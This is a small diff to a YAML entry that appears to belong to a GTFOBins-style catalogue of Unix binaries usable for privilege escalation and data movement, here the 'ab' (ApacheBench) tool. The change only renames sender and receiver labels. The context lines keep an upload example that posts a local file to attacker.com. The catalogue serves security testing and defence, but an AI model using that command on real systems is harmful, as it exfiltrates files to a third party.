@@ -7,7 +7,7 @@ functions:
       sudo:
       suid:
       unprivileged:
-    sender: HTTP
+    sender: http-server
   upload:
   - code: |-
       ab -p /path/to/input-file http://attacker.com/
@@ -15,5 +15,5 @@ functions:
       sudo:
       suid:
       unprivileged:
-    receiver: HTTP
+    receiver: http-server
 ...
